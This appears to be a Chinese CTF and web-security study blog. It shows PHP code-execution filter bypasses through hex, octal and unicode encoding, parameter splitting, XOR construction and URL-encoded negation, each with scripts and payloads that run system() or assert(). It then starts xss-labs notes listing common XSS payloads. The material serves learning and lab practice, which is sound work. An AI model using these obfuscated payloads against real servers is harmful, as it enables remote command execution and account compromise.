<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_payload</span>(<span class="params">payload</span>):</span><br><span class="line">	res_payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">		i = <span class="string">&quot;\\x&quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">		res_payload += i</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&#x27;&#123;&#125;&#x27; Convert to hex: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oct_payload</span>(<span class="params">payload</span>):</span><br><span class="line">	res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">		i = <span class="string">&quot;\\&quot;</span> + <span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">		res_payload += i</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&#x27;&#123;&#125;&#x27; Convert to oct: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uni_payload</span>(<span class="params">payload</span>):</span><br><span class="line">	res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">		i = <span class="string">&quot;\\u&#123;&#123;&#123;0&#125;&#125;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:])</span><br><span class="line">		res_payload += i</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&#x27;&#123;&#125;&#x27; Convert to unicode: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	payload = <span class="string">&#x27;phpinfo&#x27;</span></span><br><span class="line">	hex_payload(payload)</span><br><span class="line">	oct_payload(payload)</span><br><span class="line">	uni_payload(payload)</span><br></pre></td></tr></table></figure>

<p>​	编码后的字符串必须双引号包裹在进行传参</p>
<p>payload：（只是将 被过滤的关键字 编码了，如果把 整个命令 进行编码在本地运行不了）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;();					//phpinfo();</span><br><span class="line">&quot;\x73\x79\x73\x74\x65\x6d&quot;(dir);					//system(&#x27;dir&#x27;);</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&#x27;dir&#x27;);					//system(&#x27;dir&#x27;);</span><br><span class="line">&quot;\u&#123;73&#125;\u&#123;79&#125;\u&#123;73&#125;\u&#123;74&#125;\u&#123;65&#125;\u&#123;6d&#125;&quot;(&#x27;dir&#x27;);		//system(&#x27;dir&#x27;);</span><br></pre></td></tr></table></figure>

<p>​	至于可以运行的理由嘛……嗯，我也不太懂。这些字符串被编码了所以绕过了正则表达式，貌似这些被编码的字符串仍能作为原来的命令被执行，只有 <code>( )</code> 这两个字符被编码后就好像无法识别一样，在本地测试下运行不了，但也只有这两个字符(应该是，没试过其他奇怪的字符)</p>
<p>​	下面这个 <code>&quot;\x77\x68\x6f\x61\x6d\x69&quot;</code> 是 whoami 的十六进制，其他的是 system 的十六进制编码，可以看到将命令编码后仍能执行(但 <code>( )</code>不行，所以不能将带 <strong>括号</strong> 的命令整个进行编码)</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-07.jpg" alt="002-php-07"></p>
<h2 id="多次传参绕过"><a href="#多次传参绕过" class="headerlink" title="多次传参绕过"></a>多次传参绕过</h2><blockquote>
<p>适用PHP版本：无限制</p>
</blockquote>
<p>​	如果同时过滤掉了 单(双)引号，可以用下面方式进行绕过</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-08.jpg" alt="002-php-08"></p>
<p>​	用 GET方式 将想要执行的命令当作变量传入，然后再用 POST方式 将命令进行拼接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET方式:	?1=system&amp;2=whoami</span><br><span class="line">POST方式:	cmd=$_GET[1]($_GET[2]);</span><br></pre></td></tr></table></figure>

<p>​	当然也可以将 想要执行命令的字符串 都用 POST方式传入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=$_POST[1]($_POST[2]);&amp;1=system&amp;2=whoami</span><br></pre></td></tr></table></figure>

<h2 id="内置函数访问绕过"><a href="#内置函数访问绕过" class="headerlink" title="内置函数访问绕过"></a>内置函数访问绕过</h2><blockquote>
<p>适用PHP版本：PHP&gt;&#x3D;7(PHP5在本地运行报错)</p>
</blockquote>
<p>**get_defined_functions()**：获取所有已定义函数的数组，可通过 $arr[“internal”] 来访问系统内置函数，通过 $arr[“user”] 来访问用户自定义函数</p>
<p>​	<del>啊，这个太麻烦，需要知道 函数 的位置下标才能完成，可是PHP版本太多，版本不同 函数 的下标也不同，可恶，不会写脚本……正当我这么想的时候。对啊，写个脚本虽然不行，但还是可以写两三行代码凑合凑合的，想要换版本要通过小皮换，再次深刻感受到自己是个废物</del></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$str</span> = <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">get_defined_functions</span>(),<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[[0-9]+] =&gt; phpinfo/i&#x27;</span>,<span class="variable">$str</span>,<span class="variable">$number</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$number</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>大概就是这个样子，想要搜索其他函数还得自己动手修改，也只能知道个下标，<del>哎,凑合看吧</del></p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-09.jpg" alt="002-php-09"></p>
<p>payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=get_defined_functions()[internal][283]();				php7.0.9,phpinfo();</span><br><span class="line">cmd=get_defined_functions()[internal][356](whoami);			php7.3.4,system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="异或拼接绕过"><a href="#异或拼接绕过" class="headerlink" title="异或拼接绕过"></a>异或拼接绕过</h2><blockquote>
<p>适用PHP版本：PHP5以及PHP7.0.9版本</p>
</blockquote>
<p>​	在 PHP 中两个字符异或之后，得到的是还是一个字符</p>
<p>异或：对该字符对应ASCII的二进制进行的运算，两相同数字异或得0，不同数字异或得1</p>
<p>生成异或字符串的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;assert&quot;</span></span><br><span class="line">strlist = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">95</span>, <span class="number">96</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">125</span>, <span class="number">126</span>, <span class="number">127</span>]</span><br><span class="line"><span class="comment">#strlist是ascii表中所有非字母数字的字符十进制</span></span><br><span class="line">str1,str2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strlist:</span><br><span class="line">            <span class="keyword">if</span>(i ^ j == <span class="built_in">ord</span>(char)):</span><br><span class="line">                i = <span class="string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(i)[<span class="number">2</span>:])</span><br><span class="line">                j = <span class="string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(j)[<span class="number">2</span>:])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;(&#x27;&#123;0&#125;&#x27;^&#x27;&#123;1&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(i,j),end=<span class="string">&quot;.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span>	</span><br></pre></td></tr></table></figure>

<p>一次代码执行只能得到我们想要执行语句的字符串，并不能执行语句，所以需要执行两次代码执行，构造出<code>assert($_GET[_]);</code>（当然 <code>$_POST</code>也可以）</p>
<ul>
<li><p>$_GET</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);</span><br><span class="line">	<span class="comment">//$_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);</span><br><span class="line">	<span class="comment">//$__=&#x27;_GET&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line">	<span class="comment">//$___=&#x27;$_GET&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line">	<span class="comment">//assert($_GET[_]);</span></span><br><span class="line">&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line">最终payload为:</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
</li>
<li><p>$_POST</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);</span><br><span class="line">	<span class="comment">//$_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0b&#x27;</span>^<span class="string">&#x27;%5b&#x27;</span>).(<span class="string">&#x27;%0f&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%5b&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);</span><br><span class="line">	<span class="comment">//$__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line">	<span class="comment">//$___=&#x27;$_POST&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line">	<span class="comment">//assert($_PSOT[_]);</span></span><br><span class="line"></span><br><span class="line">最终payload为(记得用POST方式将命令赋值给 _变量):</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0b&#x27;</span>^<span class="string">&#x27;%5b&#x27;</span>).(<span class="string">&#x27;%0f&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%5b&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来照猫画虎构造 system(‘dir’)，用上面得方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%02&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%0d&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>);</span><br><span class="line">	<span class="comment">//$_=&#x27;system&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);</span><br><span class="line">	<span class="comment">//$__=&#x27;_GET&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line">	<span class="comment">//$___=&#x27;$_GET&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line">	<span class="comment">//system($_GET[_]);</span></span><br><span class="line">&amp;_=dir;</span><br><span class="line"></span><br><span class="line">最终payload为:</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%02&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%0d&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);&amp;_=dir;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>​	在本地测试一下，运行成功(提前先把字符集改成了gbk)</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-06.jpg" alt="002-php-06"></p>
<p>若无法使用，可以先用 phpinfo() 查看 <strong>disable_functions</strong> 是否是否禁用了 system 函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo 	<span class="comment">// 网上的payload</span></span><br></pre></td></tr></table></figure>

<h2 id="URL编码取反绕过"><a href="#URL编码取反绕过" class="headerlink" title="URL编码取反绕过"></a>URL编码取反绕过</h2><p>​	我们将 字符串 URL编码 后取反，我们传入参数后服务端进行url解码，这时由于取反后，会 解码 成不可打印字符，这样我们就会绕过 正则表达式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);	<span class="comment">//%8F%97%8F%96%91%99%90</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();		&lt;===&gt;<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<p>~：按位取反，对二进制取反(0变1，1变0)， 实际的值以补码的形式表示</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();		<span class="comment">//记得加上 (~);</span></span><br></pre></td></tr></table></figure>

<p>当 <strong>5&lt;&#x3D;PHP&lt;&#x3D;7.0.9</strong> 时，需要参考上面那个 异或拼接 的方法</p>
<ul>
<li><p>$_GET</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_=(~&#x27;%9E%8C%8C%9A%8D%8B&#x27;);$__=&#x27;_&#x27;.(~&#x27;%B8%BA%AB&#x27;);$___=$$__;$_($___[_]);&amp;_=phpinfo();</span><br><span class="line">	//assert($_GET[_]);</span><br></pre></td></tr></table></figure>
</li>
<li><p>$_POST（记得用POST方式将 phpinfo()传给 _变量）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_=(~&#x27;%9E%8C%8C%9A%8D%8B&#x27;);$__=&#x27;_&#x27;.(~&#x27;%AF%B0%AC%AB&#x27;);$___=$$__;$_($___[_]);</span><br><span class="line">	//assert($_POST[_]);</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造 system(‘dir’)，道理和异或拼接绕过一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_=(~&#x27;%8C%86%8C%8B%9A%92&#x27;);$__=&#x27;_&#x27;.(~&#x27;%B8%BA%AB&#x27;);$___=$$__;$_($___[_]);&amp;_=dir;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>当 <strong>PHP&gt;7</strong> 时，我们可以这样构造 payload</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\123&gt;<span class="title">php</span> -<span class="title">r</span> &quot;<span class="title">var_dump</span>(<span class="title">urlencode</span>(~&#x27;<span class="title">system</span>&#x27;));&quot;</span></span><br><span class="line"><span class="function"><span class="title">string</span>(18) &quot;%8<span class="title">C</span>%86%8<span class="title">C</span>%8<span class="title">B</span>%9<span class="title">A</span>%92&quot;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\123&gt;<span class="title">php</span> -<span class="title">r</span> &quot;<span class="title">var_dump</span>(<span class="title">urlencode</span>(~&#x27;<span class="title">whoami</span>&#x27;));&quot;</span></span><br><span class="line"><span class="function"><span class="title">string</span>(18) &quot;%88%97%90%9<span class="title">E</span>%92%96&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">payload</span>:</span></span><br><span class="line"><span class="function">(~%8<span class="title">C</span>%86%8<span class="title">C</span>%8<span class="title">B</span>%9<span class="title">A</span>%92)(~%88%97%90%9<span class="title">E</span>%92%96);</span></span><br><span class="line"><span class="function">	#<span class="title">system</span>(&#x27;<span class="title">whoami</span>&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://blog.csdn.net/mochu7777777/article/details/104631142">浅谈PHP代码执行中出现过滤限制的绕过执行方法</a></p>
]]></content>
      <categories>
        <category>锻体</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>Web安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs笔记</title>
    <url>/2022/10/08/100%E2%80%94xss-labs/</url>
    <content><![CDATA[<p>​	介绍：跨站脚本(Cross-Site Scripting，简称XSS)，一种针对网站应用程序的安全漏洞攻击技术。其允许 恶意用户 将代码注入网页，其他用户访问此网页时就会收到影响</p>
<p><strong>原理</strong></p>
<ul>
<li>HTML是一种超文本标记语言，将一些字符特殊地对待来区别文本和标签，如：小于符号（&lt;）被看作是HTML标签的开始</li>
<li>当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段 JS脚本时，这些脚本程序就将会在用户浏览器中执行</li>
<li>所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞</li>
</ul>
<blockquote>
<p>​	标记语言：一种将文本以及文本相关的其他信息结合起来，展现出关于文档结构和数据处理细节的 <strong>计算机文字编码</strong></p>
</blockquote>
<p><strong>危害</strong>：窃取用户Cookie、后台增删改文章、XSS钓鱼攻击、利用XSS漏洞进行传播和修改网页代码、XSS蠕虫攻击、网站重定向、获取键盘记录、获取用户信息等</p>
<p>XSS可分为三种：反射型、存储型、DOM型</p>
<p>常见XSS 的 payload：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(/xss/)</span>&gt;</span>		<span class="comment">&lt;!--svg标签用来插入图形,onload表示页面加载完成,触发弹框--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">οnlοad</span>=<span class="string">alert(</span>&quot;<span class="attr">XSS</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>      </span><br><span class="line"></span><br><span class="line">onclick=&quot;alert(/xss/)&quot;</span><br><span class="line">onmouseover=javascript:alert(/xss/)</span><br><span class="line">onmouseout=javascript:alert(/xss/)</span><br><span class="line">javascript:alert(/xss/)</span><br></pre></td></tr></table></figure>


<h1 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h1><p>​	非持久型XSS，攻击方式往往具有一次性</p>
<p>​	攻击方式：攻击者 将含XSS代码的恶意链接发送给目标用户，当用户访问时，服务器接收 目标的请求信息并进行处理，然后 服务器 把带有 XSS代码 的数据发送给目标用户的浏览器，浏览器解析这段 有XSS代码 的恶意脚本后，触发XSS漏洞</p>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h2><p>查看源码，发现其是通过 GET请求获取参数value 的值，点击搜索按钮时就显示 value 的值（只有主要代码）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和<span class="symbol">&amp;lt;</span>svg onload=alert(/xss/)<span class="symbol">&amp;gt;</span>相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level2.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&lt;svg onload=alert(/xss/)&gt;&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">&quot;搜索&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level2.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:25<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	可以看到我们输入的 XSS语句被当作value的值显示出来了，而并没有发挥原本的作用。</p>
<ul>
<li>构造语句将input标签闭合。先将value的 <strong>前双引号</strong> 闭合，不然会被当作value的值</li>
<li>然后再闭合 input标签的 <strong>前尖括号</strong> ，让我们可以添加一个标签</li>
<li>这样就完成了，也就是说在 XSS语句的基础上加 <code>&quot;&gt;</code> ，如：<code>&quot;&gt;&lt;svg onload=alert(/xss/)&gt;</code></li>
</ul>
<h2 id="level-3-4"><a href="#level-3-4" class="headerlink" title="level-3,4"></a>level-3,4</h2><p>上传第二关构造的语句后查看源码，可以看到 <code>&quot; &quot;</code> 和<code>&lt; </code> 都被转码，唯有 <code>&#39;&#39;</code> 没有，可以用 <strong>单引号</strong> 构造闭合</p>
